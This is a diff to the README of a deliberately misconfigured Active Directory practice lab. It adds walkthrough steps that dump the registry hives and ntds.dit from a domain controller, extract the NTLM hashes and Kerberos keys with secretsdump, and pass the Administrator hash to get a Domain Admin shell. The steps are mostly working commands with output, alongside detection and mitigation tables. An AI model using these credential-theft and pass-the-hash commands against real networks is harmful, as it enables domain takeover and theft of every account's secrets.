@@ -3,7 +3,7 @@
 ## Overview
 
 A basic corporate Active Directory environment with intentionally introduced misconfigurations.
-Designed to practice **LDAP Pass-Back** and **Service Binary Hijack** from a low-privileged user to SYSTEM on DC01.
+Designed to practice **LDAP Pass-Back**, **Service Binary Hijack**, **NTDS.dit extraction**, and **Pass-the-Hash** — from a low-privileged user to **Domain Admin**.
 
 ## Topology
 
@@ -38,6 +38,9 @@ reader  →  Public  →  users.txt
         →  svc_scan:Scan2024!
         →  svc_scan  →  Server Operators  →  binPath hijack  →  local admin DC01
         →  psexec  →  SYSTEM on DC01
+        →  NTDS.dit extraction (stop NTDS + robocopy /b)
+        →  secretsdump  →  NTLM Administrator
+        →  Pass-the-Hash  →  Domain Admin
 ```
 
 ## Accounts
@@ -67,6 +70,8 @@ reader  →  Public  →  users.txt
 | 4 | Credentials in Files | Scans share (XML) | T1552.001 |
 | 5 | Weak Service Permissions | `AppReadiness` on DC01 | T1574.011 |
 | 6 | Server Operators abuse | `svc_scan` | T1098 |
+| 7 | NTDS.dit accessible | DC01 (SYSTEM) | T1003.003 |
+| 8 | NTLM hash reuse (PtH) | Administrator | T1550.002 |
 
 ## Attack Steps
 
@@ -184,7 +189,6 @@ SMB  192.168.31.100  445  DC01  [+] corp.local\s.sales:Barcelona1
 SMB  192.168.31.100  445  DC01  Share           Permissions     Remark
 SMB  192.168.31.100  445  DC01  -----           -----------     ------
 SMB  192.168.31.100  445  DC01  Sales           READ,WRITE
-SMB  192.168.31.100  445  DC01  Scans           READ
 ```
 
 **`s.sales` has `READ,WRITE` on `Sales`. Let's list its contents:**
@@ -278,19 +282,6 @@ Printer2026!
 ### 5. Scans Share (svc_printer)
 
 **Goal:** find `svc_scan` credentials in the printer XML config.
-
-
-
-**Verify `s.sales` no longer has access:**
-
-```bash
-smbclient //192.168.31.100/Scans -U 'corp.local/s.sales%Barcelona1'
-```
-
-```
-smb: \> ls
-NT_STATUS_ACCESS_DENIED listing \*
-```
 
 **Access as `svc_printer`:**
 
@@ -499,6 +490,195 @@ SeImpersonatePrivilege         Enabled
 
 **Result:** `nt authority\system` on DC01.
 
+### 8. NTDS.dit Extraction (SYSTEM on DC01)
+
+**Goal:** extract `ntds.dit` + registry hives for offline hash dumping.
+
+**Note:** VSS (`diskshadow`, `vssadmin`, `ntdsutil ifm`) failed in this lab with `InitializeForBackup failed` / `error 0x80042302`. Fallback: stop NTDS, copy with `robocopy /b`, restart NTDS.
+
+**Create working directory:**
+
+```cmd
+mkdir C:\Windows\Temp\ntds -Force
+```
+
+**Save registry hives:**
+
+```cmd
+reg.exe save HKLM\SYSTEM C:\Windows\Temp\ntds\SYSTEM
+reg.exe save HKLM\SAM C:\Windows\Temp\ntds\SAM
+reg.exe save HKLM\SECURITY C:\Windows\Temp\ntds\SECURITY
+```
+
+**Output:**
+
+```
+The operation completed successfully.
+The operation completed successfully.
+The operation completed successfully.
+```
+
+**Verify sizes (must be different!):**
+
+```cmd
+dir C:\Windows\Temp\ntds
+```
+
+**Output:**
+
+```
+SAM         48,128
+SECURITY    45,056
+SYSTEM      14,974,976
+```
+
+**Stop NTDS and copy `ntds.dit`:**
+
+```cmd
+net stop ntds /y
+robocopy /b C:\Windows\NTDS C:\Windows\Temp\ntds ntds.dit
+net start ntds
+```
+
+**Output (robocopy):**
+
+```
+                           1    C:\Windows\NTDS\
+100%        New File              16.0 m        ntds.dit
+
+               Total    Copied   Skipped  Mismatch    FAILED    Extras
+    Files :         1         1         0         0         0         0
+```
+
+**Verify:**
+
+```cmd
+dir C:\Windows\Temp\ntds
+```
+
+**Output:**
+
+```
+ntds.dit    16,777,216
+SAM         48,128
+SECURITY    45,056
+SYSTEM      14,974,976
+```
+
+**Download to Parrot:**
+
+```bash
+smbclient //192.168.31.100/C$ -U 'corp.local/svc_scan%Scan2024!' \
+  -c "cd Windows\Temp\ntds; ls; get ntds.dit /tmp/ntds.dit; get SYSTEM /tmp/SYSTEM; get SAM /tmp/SAM; get SECURITY /tmp/SECURITY; exit"
+```
+
+**Verify:**
+
+```bash
+ls -lh /tmp/ntds.dit /tmp/SYSTEM /tmp/SAM /tmp/SECURITY
+```
+
+**Output:**
+
+```
+-rw-r--r-- 1 fedya fedya  16M /tmp/ntds.dit
+-rw-r--r-- 1 fedya fedya  48K /tmp/SAM
+-rw-r--r-- 1 fedya fedya  44K /tmp/SECURITY
+-rw-r--r-- 1 fedya fedya  15M /tmp/SYSTEM
+```
+
+**Result:** all four files ready for `secretsdump`.
+
+### 9. Secretsdump → NTLM Hash
+
+**Goal:** extract NTLM hash of `Administrator` from `ntds.dit`.
+
+```bash
+secretsdump.py -ntds /tmp/ntds.dit -system /tmp/SYSTEM -sam /tmp/SAM -security /tmp/SECURITY LOCAL
+```
+
+**Output (key parts):**
+
+```
+[*] Target system bootKey: 0xf6cd963d8578a5bfb5d92dc8644a0b41
+[*] Dumping local SAM hashes
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:71eeccd3839110de276b2a7adabb0da7:::
+...
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:7b71bee7907489b8dea9a06bab7917b2:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3b6c421806dafb492a3a26f87c55dc39:::
+corp.local\s.sales:1112:...:e034de88ee545374c7c13d622c6054b5:::
+corp.local\svc_printer:1126:...:35a6a27235f7ee03020b5cda8fdd8b87:::
+corp.local\svc_scan:1127:...:fe993ae02dac9f89c326b4644a9bd479:::
+...
+[*] Kerberos keys from /tmp/ntds.dit
+Administrator:aes256-cts-hmac-sha1-96:d782a0640a55847b3859a6c70c668239d787313c914e46bfcae58f0cc4e01702
+krbtgt:aes256-cts-hmac-sha1-96:940207db99471b7cf1fc7db80a79a96b421765320c22b999fe85a06fccd371e4
+...
+```
+
+**Result:** NTLM hash of `Administrator`.
+
+---
+
+### 10. Pass-the-Hash → Domain Admin
+
+**Goal:** authenticate as `Administrator` using the NTLM hash — no password needed.
+
+```bash
+nxc smb 192.168.31.100 -u Administrator -H '<NTLM_Administrator>' --local-auth
+```
+
+**Output:**
+
+```
+SMB  192.168.31.100  445  DC01  [+] CORP\Administrator:<NTLM_Administrator> (Pwn3d!)
+```
+
+**Get a full shell via WinRM:**
+
+```bash
+evil-winrm -i 192.168.31.100 -u Administrator -H '<NTLM_Administrator>'
+```
+
+**Output:**
+
+```
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+corp\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
+DC01
+```
+
+**Or via psexec (SYSTEM):**
+
+```bash
+psexec.py -hashes :<NTLM_Administrator> Administrator@192.168.31.100
+```
+
+**Output:**
+
+```
+[*] Requesting shares on 192.168.31.100.....
+[*] Found writable share ADMIN$
+[*] Uploading file ...
+[*] Opening SVCManager on 192.168.31.100.....
+[*] Creating service ...
+[*] Starting service .....
+Microsoft Windows [Version 10.0.20348.587]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+```
+
+**Result:** Domain Admin (`CORP\Administrator`) → full control over the domain.
+
+**Why it works:** NTLM authentication only needs the NT hash, not the cleartext password.
+
+---
+
 ## Detection
 
 | Attack | Event ID | Source |
@@ -508,6 +688,9 @@ SeImpersonatePrivilege         Enabled
 | binPath modification | 7040 | System Log (DC01) |
 | Service start | 7036 | System Log (DC01) |
 | Psexec | 7045 | System Log (DC01) |
+| NTDS stop | 7036 | System Log (DC01) |
+| NTDS.dit access | 4663 | DC Security Log |
+| Pass-the-Hash | 4624 (Logon Type 3, NTLM) | DC Security Log |
 
 **What to look for:**
 
@@ -524,6 +707,8 @@ SeImpersonatePrivilege         Enabled
 | LDAP Pass-Back | Use LDAPS; Kerberos instead of simple bind |
 | binPath hijack | Do not grant `Server Operators` to service accounts |
 | Psexec | Disable SMB admin shares; EDR; limit local admins |
+| NTDS.dit theft | VSS hardening; monitor NTDS stop; EDR on DC |
+| Pass-the-Hash | Disable NTLM; use Kerberos; Protected Users |
 
 ## References
 
@@ -534,4 +719,4 @@ SeImpersonatePrivilege         Enabled
 
 ## Status
 
-WIP — chain completed up to **SYSTEM on DC01**.
+Complete — chain from `reader` to **Domain Admin** via Pass-Back, binPath hijack, NTDS.dit extraction, and Pass-the-Hash.
